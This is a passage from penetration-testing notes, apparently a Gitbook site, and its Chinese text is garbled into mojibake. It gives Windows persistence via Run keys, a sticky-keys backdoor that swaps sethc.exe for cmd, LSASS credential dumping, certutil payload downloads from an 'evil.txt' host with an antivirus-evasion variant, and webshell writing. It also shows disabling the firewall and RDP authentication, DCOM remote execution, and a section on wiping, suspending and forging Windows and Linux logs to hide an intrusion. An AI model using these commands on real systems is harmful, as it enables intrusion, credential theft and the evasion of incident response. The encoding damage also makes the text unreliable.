C:\\Users\\\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup # ä»»æ„ç”¨æˆ·ç™»å½•æ—¶ C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp æ³¨å†Œè¡¨å¯åŠ¨é¡¹ # å½“å‰ç”¨æˆ·ç™»å½•æ—¶ HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce # ä»»æ„ç”¨æˆ·ç™»å½•æ—¶ HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce æ–°å»ºä¸€ä¸ªå€¼ RDPåé—¨ æ‹¥æœ‰RDPæƒé™ï¼Œåœ¨å¯¹æ–¹é”å±å¹¶ä¸çŸ¥é“å¯†ç æ—¶ä»å¯ä»¥ä½¿ç”¨ç»ˆç«¯çš„æ–¹æ³• ç²˜æ»é”® è¿ç»­æŒ‰ä¸‹SHIFT5 æ¬¡åï¼ŒWindows å°†æ‰§è¡ŒC:\\Windows\\System32\\sethc.exe. å°†sethcæ›¿æ¢ä¸ºcmd C:\\> takeown /f c:\\Windows\\System32\\sethc.exe SUCCESS: The file (or folder): \"c:\\Windows\\System32\\sethc.exe\" now owned by user \"PURECHAOS\\Administrator\". C:\\> icacls C:\\Windows\\System32\\sethc.exe /grant Administrator:F processed file: C:\\Windows\\System32\\sethc.exe Successfully processed 1 files; Failed processing 0 files C:\\> copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe Overwrite C:\\Windows\\System32\\sethc.exe? (Yes/No/All): yes 1 file(s) copied. æœ¬æœºä¿¡æ¯æ”¶é›† # ç½‘å¡ ipconfig /all # è·¯ç”± route print # arpç¼“å­˜ arp -a # åŸŸï¼Œè¡¥ä¸ï¼Œç³»ç»Ÿå‹å· systeminfo # æŸ¥çœ‹å®‰è£…ç¨‹åºå’Œç‰ˆæœ¬ä¿¡æ¯ wmic product get name,version # è¿›ç¨‹ tasklist Windowså‘½ä»¤ dumpå†…å­˜ # æŸ¥çœ‹LsassPi # å‘½ä»¤è¡Œ procdump.exe -r -ma lsass.exe output_name # é»˜è®¤ä¿å­˜åˆ°å½“å‰è·¯å¾„ä¸‹çš„output_name.dmp sqldump.exe LsassPid 0 0x01100 # å›¾å½¢ç•Œé¢ ä»»åŠ¡ç®¡ç†å™¨-è¯¦ç»†ä¿¡æ¯(detail)-å³é”®è½¬å‚¨-é»˜è®¤ä¿å­˜åˆ°C:\\Users\\xxx\\AppData\\Local\\Temp\\ä¸‹ process explore-å³é”®è½¬å‚¨ æ–‡ä»¶æ“ä½œ æ–‡ä»¶ä¼ è¾“ åŸç”Ÿå‘½ä»¤ powershell -c \"(new-object System.Net.WebClient).DownloadFile('','')\" powershell (new-object System.Net.WebClient).DownloadFile('','') bitsadmin /transfer n certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php ç»•è¿‡ç«ç»’ä¸‹è½½æ–‡ä»¶ï¼Œå•è¯åŠ åŒå¼•å·ï¼Œä¸­é—´å¯ä»¥æ’å…¥ä»»æ„æ•°é‡çš„æˆå¯¹åŒå¼•å· \"c\"\"e\"\"r\"\"t\"\"u\"\"t\"\"i\"\"l\" -\"u\"\"r\"\"l\"\"c\"\"a\"\"c\"\"h\"\"e\" -split -f https://url/1.exe 1.exe å°å·¥å…· echo y | pscp.exe -pw sshå¯†ç  -P sshç«¯å£ \"å•ä¸ªæ–‡ä»¶è·¯å¾„\" user@ip:ä¿å­˜è·¯å¾„ echo y | pscp.exe -pw sshå¯†ç  -P sshç«¯å£ -r \"ç›®å½•è·¯å¾„\" user@ip:ä¿å­˜è·¯å¾„ æ–‡ä»¶/ç›®å½•æŸ¥æ‰¾ # åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶ dir /b /s c:\\ > c.txt # æŸ¥æ‰¾æ–‡ä»¶ dir c:\\ /s /b | find \"win.ini\" # é€’å½’æœç´¢Eç›˜ï¼Œåç¼€ä¸ºexeï¼Œä¿®æ”¹æ—¥æœŸ>=2023/12/16çš„æ–‡ä»¶ FORFILES /P E:\\ /S /M *.exe /C \"cmd /c echo @path\" /D +2023/12/16 > res.txt æ–‡ä»¶å†™å…¥ echo \"\" >> shell.php certutilç¼–ç æ–‡ä»¶ certutil -encode 1.txt output.txt certutilè§£ç æ–‡ä»¶ certutil -decode output.txt input.txt powershell -c \"'æ–‡ä»¶å†…å®¹' | Out-File input.txt -Append\" # å†™å…¥ powershell -c \"add-content æ–‡ä»¶ -value \\\"æ–‡ä»¶å†…å®¹\\\"\" # å»é™¤æ¢è¡Œ powershell \"-join((gc -LiteralPath \\\"æ–‡ä»¶\\\"))\" è§£å‹ç¼© windowsè‡ªå¸¦å‘½ä»¤ å•ä¸ªæ–‡ä»¶ # è§£å‹ expand -r file.zip extract_path # å‹ç¼© makecab 1.txt 1.zip å¤šæ–‡ä»¶ # å‡è®¾ç°æœ‰æ–‡ä»¶å¤¹test E:\\test\\æ–‡ä»¶1.txt E:\\test\\æ–‡ä»¶2.txt E:\\test\\abc\\æ–‡ä»¶3.txt #è¦å‹ç¼©æ•´ä¸ªæ–‡ä»¶å¤¹éœ€è¦å°†testä¸‹æ‰€æœ‰æ–‡ä»¶åˆ—ä¸€ä¸ªæ¸…å•ï¼Œæ¯”å¦‚E:\\list.txtï¼š test\\æ–‡ä»¶1.txt test\\æ–‡ä»¶2.txt test\\abc\\æ–‡ä»¶3.txt # æ‰§è¡Œå‹ç¼©ï¼Œæœ€åç”Ÿæˆä¸€ä¸ªcabæ–‡ä»¶ï¼Œæ”¹åç¼€ä¸ºzipå³å¯ï¼Œè€Œä¸”ç”Ÿæˆçš„zipå†…éƒ¨æ–‡ä»¶å…¨éƒ¨åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹ makecab /f F:\\list.txt #è§£å‹ï¼ˆè¾“å‡ºæ–‡ä»¶å¤¹å¿…é¡»å­˜åœ¨ï¼Œå¦åˆ™ä¸æˆåŠŸï¼‰ï¼š expand -F:* test.zip E:\\output\\ Rar64.exe å‹ç¼©æ–‡ä»¶å¤¹ï¼ˆä¸åŒ…å«å­ç›®å½•ï¼‰ï¼š rar.exe a \"å‹ç¼©åŒ…ä¿å­˜è·¯å¾„æ–‡ä»¶å\" \"è¢«å‹ç¼©çš„æ–‡ä»¶å¤¹è·¯å¾„\" å‹ç¼©æ–‡ä»¶å¤¹ï¼ˆåŒ…å«å­ç›®å½•ï¼‰ï¼š rar.exe a -r \"å‹ç¼©åŒ…ä¿å­˜è·¯å¾„æ–‡ä»¶å\" \"è¢«å‹ç¼©çš„æ–‡ä»¶å¤¹è·¯å¾„\" å‹ç¼©æ–‡ä»¶å¤¹ï¼ˆä»¥æ—¶é—´å‘½åå‹ç¼©åŒ…ï¼‰ï¼š rar.exe a -ag -r -s -ibck \"å‹ç¼©åŒ…ä¿å­˜è·¯å¾„ï¼ˆè®°å¾—åœ¨æœ€ååŠ \\ï¼‰\" \"è¢«å‹ç¼©çš„æ–‡ä»¶å¤¹è·¯å¾„\" 7z.exe 7z a -mx -myx -mmt=off -ms=on -mtm=off -mtc=off -mta=off -mtr=off -m0=LZMA:d=384m:fb=273:lc=8 -mmc=1000000000 -- \"å‹ç¼©åŒ…ä¿å­˜è·¯å¾„æ–‡ä»¶å\" \"Users\\*\" é˜²ç«å¢™æ“ä½œ ä½¿ç”¨å‘½ä»¤è¡Œç®¡ç† Windows é˜²ç«å¢™ - Windows Security | Microsoft Learn https://learn.microsoft.com/zh-cn/windows/security/operating-system-security/network-security/windows-firewall/configure-with-command-line?tabs=cmd # é«˜ç‰ˆæœ¬ç³»ç»Ÿ netsh advfirewall firewall netsh firewall # ä½ç‰ˆæœ¬ç³»ç»Ÿ netsh firewall # æŸ¥çœ‹é˜²ç«å¢™è§„åˆ™ netsh firewall show config netsh firewall show state # å¼€å¯é˜²ç«å¢™ netsh advfirewall set allprofiles state on # å…³é—­é˜²ç«å¢™ netsh advfirewall set allprofiles state off æ³¨å†Œè¡¨æ“ä½œ æ—¥å¿—æ“ä½œ Powershellå‘½ä»¤ # æŸ¥çœ‹Powershellå†å²å‘½ä»¤ type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt type %appdata%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt å¸¸ç”¨çš„ç³»ç»Ÿå˜é‡ æŸ¥çœ‹å½“å‰ç”¨æˆ·ç›®å½•%HOMEPATH æŸ¥çœ‹å½“å‰ç›®å½•%CD% åˆ—å‡ºç”¨æˆ·å…±äº«ä¸»ç›®å½•çš„ç½‘ç»œè·¯å¾„%HOMESHARE% åˆ—å‡ºæœ‰æ•ˆçš„å½“å‰ç™»å½•ä¼šè¯çš„åŸŸåæ§åˆ¶å™¨å åˆ—å‡ºäº†å¯æ‰§è¡Œæ–‡ä»¶çš„æœç´¢è·¯å¾„%Path% åˆ—å‡ºäº†å¤„ç†å™¨çš„èŠ¯ç‰‡æ¶æ„%PROCESSOR_ARCHITECTURE% åˆ—å‡ºäº†Program Filesæ–‡ä»¶å¤¹çš„è·¯å¾„%ProgramFiles% åˆ—å‡ºäº†å½“å‰ç™»å½•çš„ç”¨æˆ·å¯ç”¨åº”ç”¨ç¨‹åºçš„é»˜è®¤ä¸´æ—¶ç›®å½•%TEMP% and %TMP% åˆ—å‡ºäº†å½“å‰ç™»å½•çš„ç”¨æˆ·å¯ç”¨åº”ç”¨ç¨‹åºçš„é»˜è®¤ä¸´æ—¶ç›®å½•%TEMP% and %TMP% åˆ—å‡ºäº†åŒ…å«ç”¨æˆ·å¸å·çš„åŸŸçš„åå­—%USERDOMAIN% åˆ—å‡ºæ“ä½œç³»ç»Ÿç›®å½•çš„ä½ç½®%WINDIR% è¿”å›â€œæ‰€æœ‰ç”¨æˆ·â€é…ç½®æ–‡ä»¶çš„ä½ç½®%ALLUSERSPROFILE% è¿”å›å¤„ç†å™¨æ•°ç›®%NUMBER_OF_PROCESSORS% powershellåœ°å€%PSModulePath% è®¡åˆ’ä»»åŠ¡ Windows Server 2012 ä»¥åçš„ç‰ˆæœ¬æ²¡æœ‰atå‘½ä»¤ï¼Œåªæœ‰schtaskså‘½ä»¤ RDPè¿œç¨‹æ¡Œé¢ # è¿æ¥rdp win+r mstsc # æŸ¥è¯¢æ³¨å†Œè¡¨ï¼Œè‹¥å­—æ®µå€¼ä¸º0ï¼Œåˆ™è¡¨ç¤ºå·²å¯åŠ¨RDPï¼›è‹¥ä¸º1ï¼Œåˆ™è¡¨ç¤ºç¦ç”¨RDP reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections # å¼€å¯è¿œç¨‹æ¡Œé¢ reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f # å…³é—­â€œä»…å…è®¸è¿è¡Œä½¿ç”¨ç½‘ç»œçº§åˆ«èº«ä»½éªŒè¯çš„è¿œç¨‹æ¡Œé¢çš„è®¡ç®—æœºè¿æ¥â€ï¼ˆé‰´æƒï¼‰ reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 # è®¾ç½®é˜²ç«å¢™ç­–ç•¥æ”¾è¡Œ3389ç«¯å£ netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow DCOMç»„ä»¶æ‰§è¡Œå‘½ä»¤ $com = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"IP\")) # ç¬¬ä¸‰ä¸ªå‚æ•°Minimizedç”¨äºéšè—cmdçª—å£ $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,\"/c \",\"Minimized\") Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-07-10 20:42:25 "},"02.åæ¸—é€/WindowsåŸŸæ¸—é€/å…¥ä¾µç—•è¿¹æ¸…ç†.html":{"url":"02.åæ¸—é€/WindowsåŸŸæ¸—é€/å…¥ä¾µç—•è¿¹æ¸…ç†.html","title":"å…¥ä¾µç—•è¿¹æ¸…ç†","keywords":"","body":" è½¬è½½è‡ªhttps://www.cnblogs.com/yokan/p/15701536.html åœ¨æ”»å‡»ç»“æŸåï¼Œå¦‚ä½•ä¸ç•™ç—•è¿¹çš„æ¸…é™¤æ—¥å¿—å’Œæ“ä½œè®°å½•ï¼Œä»¥æ©ç›–å…¥ä¾µè¸ªè¿¹ï¼Œè¿™å…¶å®æ˜¯ä¸€ä¸ªç»†è‡´çš„æŠ€æœ¯æ´»ã€‚åœ¨è“é˜Ÿçš„æº¯æºä¸­ï¼Œæ”»å‡»è€…çš„æ”»å‡»è·¯å¾„éƒ½å°†è®°å½•åœ¨æ—¥å¿—ä¸­ï¼Œæ‰€é—ç•™çš„å·¥å…·ä¹Ÿä¼šè¢«è“é˜Ÿè¿›è¡Œåˆ†æï¼Œåœ¨å·¥å…·ä¸­å¯ä»¥æŸ¥æ‰¾ç‰¹å¾ï¼Œçº¢é˜Ÿè‡ªç ”å·¥å…·æ›´å®¹æ˜“ç•™ä¸‹è››ä¸é©¬è¿¹ã€‚ä½ æ‰€åšçš„æ¯ä¸€ä¸ªæ“ä½œï¼Œéƒ½è¦è¢«æŠ¹æ‰ï¼›ä½ æ‰€ä¸Šä¼ çš„å·¥å…·ï¼Œéƒ½åº”è¯¥è¢«å®‰å…¨åœ°åˆ æ‰ï¼Œä»¥é˜²è¢«æº¯æºåœ¨æ¼”ç»ƒä¸­å¤±åˆ†ã€‚ Windowså…¥ä¾µç—•è¿¹æ¸…ç† Windowsæ—¥å¿—æ¸…é™¤ Windowsæ—¥å¿—è·¯å¾„ï¼š ç³»ç»Ÿæ—¥å¿—ï¼š%SystemRoot%\\System32\\Winevt\\Logs\\System.evtx å®‰å…¨æ—¥å¿—ï¼š%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx åº”ç”¨ç¨‹åºæ—¥å¿—ï¼š%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx æ—¥å¿—åœ¨æ³¨å†Œè¡¨çš„é”®ï¼šHKEY_LOCAL_MACHINE\\system\\CurrentControlSet\\Services\\Eventlog å¸¸è§çš„å®‰å…¨äº‹ä»¶IDï¼š windows æ—¥å¿—æ¸…é™¤æ–¹å¼ï¼š ï¼ˆ1ï¼‰æœ€ç®€å•ç²—æš´çš„æ–¹å¼ å¼€å§‹â†’è¿è¡Œ,è¾“å…¥ eventvwr è¿›å…¥äº‹ä»¶æŸ¥çœ‹å™¨ï¼Œå³è¾¹æ é€‰æ‹©æ¸…é™¤æ—¥å¿—ã€‚ æˆ–è€…ä½¿ç”¨wevtutil wevtutil el åˆ—å‡ºç³»ç»Ÿä¸­æ‰€æœ‰æ—¥å¿—åç§° for /F \"tokens=*\" %a in ('wevtutil.exe el') DO wevtutil.exe cl \"%a\" æ¸…é™¤æ‰€æœ‰æ—¥å¿— wevtutil cl system æ¸…ç†ç³»ç»Ÿæ—¥å¿— wevtutil cl application æ¸…ç†åº”ç”¨ç¨‹åºæ—¥å¿— wevtutil cl security æ¸…ç†å®‰å…¨æ—¥å¿— ï¼ˆ2ï¼‰powershellä¸€é”®æ¸…é™¤Windowsäº‹ä»¶æ—¥å¿— PowerShell -Command \"& {Clear-Eventlog -Log Application,System,Security}\" æˆ– Get-WinEvent -ListLog Application,Setup,Security -Force | % {Wevtutil.exe cl $_.Logname} â­ï¼ˆ3ï¼‰åˆ©ç”¨è„šæœ¬åœæ­¢æ—¥å¿—çš„è®°å½• é€šè¿‡è¯¥è„šæœ¬éå†äº‹ä»¶æ—¥å¿—æœåŠ¡è¿›ç¨‹ï¼ˆä¸“ç”¨svchost.exeï¼‰çš„çº¿ç¨‹å †æ ˆï¼Œå¹¶æ ‡è¯†äº‹ä»¶æ—¥å¿—çº¿ç¨‹ä»¥æ€æ­»äº‹ä»¶æ—¥å¿—æœåŠ¡çº¿ç¨‹ã€‚ è¯¥è„šæœ¬æ²¡æœ‰æ€æ­»è¿›ç¨‹ï¼Œè€Œæ˜¯æ€æ­»äº†çº¿ç¨‹ã€‚å› æ­¤ï¼Œè™½ç„¶äº‹ä»¶æ—¥å¿—æœåŠ¡ä¼¼ä¹åœ¨ç³»ç»Ÿä¸­è¿è¡Œï¼ˆå› ä¸ºæ²¡æœ‰ç»ˆæ­¢è¿›ç¨‹ï¼‰ï¼Œä½†å®ƒå®é™…ä¸Šå¹¶æ²¡æœ‰è¿è¡Œï¼ˆå› ä¸ºç»ˆæ­¢äº†çº¿ç¨‹ï¼‰å¹¶ä¸”ç³»ç»Ÿä¸æ”¶é›†æ—¥å¿—ã€‚ é¡¹ç›®åœ°å€ï¼šhlldz/Phant0m: Windows Event Log Killer (github.com) ä½¿ç”¨ï¼š æ‰§è¡Œphant0mä¹‹åï¼Œå°è¯•è¿œç¨‹ç™»å½•è¯¥æœåŠ¡å™¨ï¼Œå¹¶ä¸ä¼šè®°å½•æ—¥å¿— â­ï¼ˆ4ï¼‰Windowså•æ¡æ—¥å¿—æ¸…é™¤ é¡¹ç›®åœ°å€ï¼šQAX-A-Team/EventCleaner: A tool mainly to erase specified records from Windows event logs, with additional functionalities. (github.com) è¯¥å·¥å…·ä¸»è¦ç”¨äºä»Windowsäº‹ä»¶æ—¥å¿—ä¸­åˆ é™¤æŒ‡å®šçš„è®°å½•ã€‚åŒæ—¶ä¹Ÿå¯ä»¥æš‚åœæ—¥å¿—çº¿ç¨‹,åœæ­¢æ—¥å¿—è®°å½•ã€‚ ä½¿ç”¨æ­¥éª¤ï¼š 1ã€EventCleaner closehandle #è§£é™¤ security.evtxçš„æ–‡ä»¶å å‘ 2ã€EventCleaner 100 #åˆ é™¤ event record id ä¸º 100 çš„æ—¥å¿— 3ã€EventCleaner suspend #æš‚åœæ—¥å¿—çº¿ç¨‹,åœæ­¢æ—¥å¿—è®°å½• 4ã€do anything without worrying about logs 5ã€EventCleaner normal #æ¢å¤æ—¥å¿—çº¿ç¨‹ 6ã€delete EventCleaner ï¼ˆ5ï¼‰Windowsæ—¥å¿—ä¼ªé€  ä½¿ç”¨eventcreateè¿™ä¸ªå‘½ä»¤è¡Œå·¥å…·æ¥ä¼ªé€ æ—¥å¿—æˆ–è€…ä½¿ç”¨è‡ªå®šä¹‰çš„å¤§é‡åƒåœ¾ä¿¡æ¯è¦†ç›–ç°æœ‰æ—¥å¿—ã€‚ eventcreate -l system -so administrator -t warning -d \"this is a test\" -id 500 IISæ—¥å¿— IISé»˜è®¤æ—¥å¿—è·¯å¾„ï¼š %SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC1\\ æ¸…é™¤WWWæ—¥å¿—ï¼š åœæ­¢æœåŠ¡ï¼šnet stop w3svc åˆ é™¤æ—¥å¿—ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼šdel *.* å¯ç”¨æœåŠ¡ï¼šnet start w3svc åˆ©ç”¨Windowsè‡ªå¸¦å‘½ä»¤è¿›è¡Œå®‰å…¨æ“¦é™¤ ï¼ˆ1ï¼‰Shift+Deleteå¿«æ·é”®æ°¸ä¹…åˆ é™¤ ç›´æ¥åˆ é™¤æ–‡ä»¶ï¼Œè¿˜æ˜¯èƒ½åœ¨å›æ”¶ç«™æ‰¾åˆ°çš„ï¼Œä½¿ç”¨Shift+Deleteå¿«æ·é”®å¯ä»¥ç›´æ¥æ°¸ä¹…åˆ é™¤äº†ã€‚ å¯ä»¥ç”¨æ•°æ®æ¢å¤è½¯ä»¶ï¼Œåˆ é™¤çš„æ–‡ä»¶å°½å¿«æ¢å¤ï¼Œå¦åˆ™æ–°çš„æ–‡ä»¶å­˜å…¥è¦†ç›–äº†åŸæ¥çš„æ–‡ä»¶ç—•è¿¹å°±å¾ˆéš¾æ¢å¤äº†ã€‚ ï¼ˆ2ï¼‰Cipher å‘½ä»¤å¤šæ¬¡è¦†å†™ åœ¨åˆ é™¤æ–‡ä»¶åï¼Œå¯ä»¥åˆ©ç”¨Cipher å‘½ä»¤é€šè¿‡ /W å‚æ•°å¯åå¤å†™å…¥å…¶ä»–æ•°æ®è¦†ç›–å·²åˆ é™¤æ–‡ä»¶çš„ç¡¬ç›˜ç©ºé—´ï¼Œå½»åº•åˆ é™¤æ•°æ®é˜²æ­¢è¢«æ¢å¤ã€‚ æ¯”å¦‚ï¼Œåˆ é™¤D:\\toolsç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œè¿™æ¡å‘½ä»¤ï¼š cipher /w:D:\\tools è¿™æ ·ä¸€æ¥ï¼ŒD ç›˜ä¸Šæœªä½¿ç”¨ç©ºé—´å°±ä¼šè¢«è¦†ç›–ä¸‰æ¬¡ï¼šä¸€æ¬¡ 0x00ã€ä¸€æ¬¡ 0xFFï¼Œä¸€æ¬¡éšæœºæ•°ï¼Œæ‰€æœ‰è¢«åˆ é™¤çš„æ–‡ä»¶å°±éƒ½ä¸å¯èƒ½è¢«æ¢å¤äº†ã€‚ ï¼ˆ3ï¼‰Formatå‘½ä»¤è¦†ç›–æ ¼å¼åŒ– Format å‘½ä»¤åŠ ä¸Š /P å‚æ•°åï¼Œå°±ä¼šæŠŠæ¯ä¸ªæ‰‡åŒºå…ˆæ¸…é›¶ï¼Œå†ç”¨éšæœºæ•°è¦†ç›–ã€‚è€Œä¸”å¯ä»¥è¦†ç›–å¤šæ¬¡ã€‚æ¯”å¦‚ï¼š format D: /P:8 è¿™æ¡å‘½ä»¤è¡¨ç¤ºæŠŠ D ç›˜ç”¨éšæœºæ•°è¦†ç›– 8 æ¬¡ã€‚ æ¸…é™¤è¿œç¨‹æ¡Œé¢è¿æ¥è®°å½• å½“é€šè¿‡æœ¬æœºè¿œç¨‹è¿æ¥å…¶ä»–å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨åï¼Œä¼šåœ¨æœ¬æœºå­˜ç•™è¿œç¨‹æ¡Œé¢è¿æ¥è®°å½•ã€‚ä»£ç ä¿å­˜ä¸ºclear.batæ–‡ä»¶ï¼ŒåŒå‡»è¿è¡Œå³å¯è‡ªåŠ¨åŒ–æ¸…é™¤è¿œç¨‹æ¡Œé¢è¿æ¥è®°å½•ã€‚ @echo off reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" cd %userprofile%\\documents\\ attrib Default.rdp -s -h del Default.rdp Metasploit ç—•è¿¹æ¸…é™¤ ï¼ˆ1ï¼‰æŸ¥çœ‹äº‹ä»¶æ—¥å¿— meterpreter > run event_manager -i [*] Retriving Event Log Configuration Event Logs on System ==================== Name Retention Maximum Size Records ---- --------- ------------ ------- Application Disabled 20971520K 2149 HardwareEvents Disabled 20971520K 0 Internet Explorer Disabled K 0 Key Management Service Disabled 20971520K 0 Security Disabled 20971520K 1726 System Disabled 20971520K 3555 Windows PowerShell Disabled 15728640K 138 ï¼ˆ2ï¼‰æ¸…é™¤äº‹ä»¶æ—¥å¿—ï¼ˆåŒ…æ‹¬å…­ç§æ—¥å¿—ç±»å‹ï¼‰ meterpreter > run event_manager -c ï¼ˆ3ï¼‰å¦å¤–ï¼Œä¹Ÿå¯ä»¥è¾“å…¥clearvå‘½ä»¤æ¸…é™¤ç›®æ ‡ç³»ç»Ÿçš„äº‹ä»¶æ—¥å¿—ï¼ˆä»…åŒ…å«ä¸‰ç§æ—¥å¿—ç±»å‹ï¼‰ meterpreter > clearev [*] Wiping 4 records from Application... [*] Wiping 8 records from System... [*] Wiping 7 records from Security... æ¸…é™¤recent åœ¨æ–‡ä»¶èµ„æºç®¡ç†å™¨ä¸­ç‚¹å‡»â€œæŸ¥çœ‹â€->â€œé€‰é¡¹â€->åœ¨å¸¸è§„->éšç§ä¸­ç‚¹å‡»â€æ¸…é™¤â€æŒ‰é’® æˆ–ç›´æ¥æ‰“å¼€C:\\Users\\Administrator\\Recentå¹¶åˆ é™¤æ‰€æœ‰å†…å®¹ æˆ–åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥del /f /s /q â€œ%userprofile%\\Recent*.* Linuxå…¥ä¾µç—•è¿¹æ¸…ç† ï¼ˆ #ç®¡ç†å‘˜ $æ™®é€šç”¨æˆ· / è¡¨ç¤º æ ¹ç›®å½• ~è¡¨ç¤ºå½“å‰ç”¨æˆ·å®¶ç›®å½•ï¼‰ æ¸…é™¤historyå†å²å‘½ä»¤è®°å½• æŸ¥çœ‹å†å²æ“ä½œå‘½ä»¤ï¼š history historyæ˜¾ç¤ºå†…å­˜å’Œ~/.bash_historyä¸­çš„æ‰€æœ‰å†…å®¹ï¼› å†…å­˜ä¸­çš„å†…å®¹å¹¶æ²¡æœ‰ç«‹åˆ»å†™å…¥~/.bash_historyï¼Œåªæœ‰å½“å½“å‰shellå…³é—­æ—¶æ‰ä¼šå°†å†…å­˜å†…å®¹å†™å…¥shell ï¼ˆ1ï¼‰ç¼–è¾‘historyè®°å½•æ–‡ä»¶ï¼Œåˆ é™¤éƒ¨åˆ†ä¸æƒ³è¢«ä¿å­˜çš„å†å²å‘½ä»¤ã€‚ vim ~/.bash_history ï¼ˆ2ï¼‰æ¸…é™¤å½“å‰ç”¨æˆ·çš„historyå‘½ä»¤è®°å½•â­ history -c # åˆ é™¤å†…å­˜ä¸­çš„æ‰€æœ‰å‘½ä»¤å†å² history -r # åˆ é™¤å½“å‰ä¼šè¯å†å²è®°å½• ï¼ˆ3ï¼‰åˆ©ç”¨vimç‰¹æ€§åˆ é™¤å†å²å‘½ä»¤ #ä½¿ç”¨vimæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶vi test.txt# è®¾ç½®vimä¸è®°å½•å‘½ä»¤ï¼ŒVimä¼šå°†å‘½ä»¤å†å²è®°å½•ï¼Œä¿å­˜åœ¨viminfoæ–‡ä»¶ä¸­ã€‚:set history=0# ç”¨vimçš„åˆ†å±åŠŸèƒ½æ‰“å¼€å‘½ä»¤è®°å½•æ–‡ä»¶.bash_historyï¼Œç¼–è¾‘æ–‡ä»¶åˆ é™¤å†å²æ“ä½œå‘½ä»¤ï¼švsp ~/.bash_history# æ¸…æ¥šä¿å­˜.bash_historyæ–‡ä»¶å³å¯ã€‚ ï¼ˆ4ï¼‰åœ¨vimä¸­æ‰§è¡Œè‡ªå·±ä¸æƒ³è®©åˆ«äººçœ‹åˆ°çš„å‘½ä»¤ :set history=0 :!command â­ä¸è®°å½•historyå†å²å‘½ä»¤ ï¼ˆ1ï¼‰é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶/etc/profileï¼Œä½¿ç³»ç»Ÿä¸å†ä¿å­˜å‘½ä»¤è®°å½•ã€‚ HISTSIZE=0 ï¼ˆ2ï¼‰ç™»å½•åæ‰§è¡Œä¸‹é¢å‘½ä»¤,ä¸è®°å½•å†å²å‘½ä»¤(.bash_history) unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0 æ¸…é™¤ç³»ç»Ÿæ—¥å¿—ç—•è¿¹ Linux ç³»ç»Ÿå­˜åœ¨å¤šç§æ—¥å¿—æ–‡ä»¶ï¼Œæ¥è®°å½•ç³»ç»Ÿè¿è¡Œè¿‡ç¨‹ä¸­äº§ç”Ÿçš„æ—¥å¿—ã€‚ /var/run/utmp è®°å½•ç°åœ¨ç™»å…¥çš„ç”¨æˆ·ï¼Œä½¿ç”¨w,who,usersç­‰å‘½ä»¤æŸ¥çœ‹ /var/log/wtmp è®°å½•ç”¨æˆ·æ‰€æœ‰çš„ç™»å…¥å’Œç™»å‡ºï¼Œä½¿ç”¨lastå‘½ä»¤æŸ¥çœ‹ /var/log/lastlog è®°å½•æ¯ä¸€ä¸ªç”¨æˆ·æœ€åç™»å…¥æ—¶é—´ï¼Œä½¿ç”¨lastlogå‘½ä»¤æŸ¥çœ‹ /var/log/btmp è®°å½•æ‰€æœ‰ç™»å½•å¤±è´¥ä¿¡æ¯ï¼Œä½¿ç”¨lastbå‘½ä»¤æŸ¥çœ‹ /var/log/auth.log éœ€è¦èº«ä»½ç¡®è®¤çš„æ“ä½œ /var/log/secure è®°å½•å®‰å…¨ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯ /var/log/maillog è®°å½•é‚®ä»¶ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯ /var/log/message è®°å½•ç³»ç»Ÿå¯åŠ¨åçš„ä¿¡æ¯å’Œé”™è¯¯æ—¥å¿— /var/log/cron è®°å½•å®šæ—¶ä»»åŠ¡ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯ /var/log/spooler è®°å½•UUCPå’Œnewsè®¾å¤‡ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯ /var/log/boot.log è®°å½•å®ˆæŠ¤è¿›ç¨‹å¯åŠ¨å’Œåœæ­¢ç›¸å…³çš„æ—¥å¿—æ¶ˆæ¯ ï¼ˆ1ï¼‰æ¸…ç©ºæ—¥å¿—æ–‡ä»¶ ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š cat /dev/null > filename echo \"\" > filename echo > filename : > filename > filename â­ï¼ˆ2ï¼‰æ›¿æ¢/åˆ é™¤éƒ¨åˆ†æ—¥å¿— 